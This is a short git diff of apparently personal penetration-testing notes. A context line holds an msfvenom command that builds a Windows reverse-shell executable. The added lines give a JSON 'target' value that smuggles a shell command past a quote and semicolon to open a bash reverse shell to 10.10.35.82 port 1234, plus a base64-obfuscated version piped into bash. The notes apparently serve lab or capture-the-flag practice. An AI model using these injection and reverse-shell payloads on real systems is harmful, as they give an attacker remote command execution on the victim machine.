@@ -57,6 +57,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o reverse.
 https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 
 
-
-
-
+burp
+{"target":"\"; echo bash -i >& /dev/tcp/10.10.35.82/1234 0>&1  \n"}
+base64 {"target":"\"; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4zNS44Mi8xMjM0IDA+JjE= | base64 -d | bash \n"}
